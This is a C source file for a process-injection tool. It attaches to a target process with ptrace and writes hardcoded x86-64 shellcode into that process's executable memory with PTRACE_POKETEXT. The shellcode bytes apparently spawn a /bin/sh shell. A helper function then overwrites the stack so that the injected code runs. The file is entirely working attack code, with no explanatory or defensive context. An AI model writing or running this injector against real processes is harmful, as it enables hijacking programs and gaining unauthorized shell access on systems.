#include "proc_vm_writev_premitives.h"
#include "procfs_utils.h"
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

int ptrace_poketext_write(long pid, long addr, const char *payload) {
  ptrace(PTRACE_ATTACH, pid, NULL, NULL);
  wait(NULL);

  size_t payload_size = strlen(payload);
  uint64_t *payload_copy = (uint64_t *)payload;

  for (size_t i = 0; i < payload_size; i += 8, payload_copy++) {
    ptrace(PTRACE_POKETEXT, pid, addr + i, *payload_copy);
  }

  return 0;
}

char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                  "\x91\xd0\x8c\x97\xff\x48\xf7"
                  "\xdb\x53\x54\x5f\x99\x52\x57"
                  "\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, const char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "missing PID arg for the process to inject code to.\n");
    exit(EXIT_FAILURE);
  }

  long pid = strtol(argv[1], (char **)NULL, 10);

  kill(pid, SIGSTOP);

  long addr = procfs_find_executable_region_start_address(pid);

  ptrace_poketext_write(pid, addr, SHELLCODE);

  process_vm_writev_stack_overwrite_exec(pid, addr);

  kill(pid, SIGCONT);

  return 0;
}
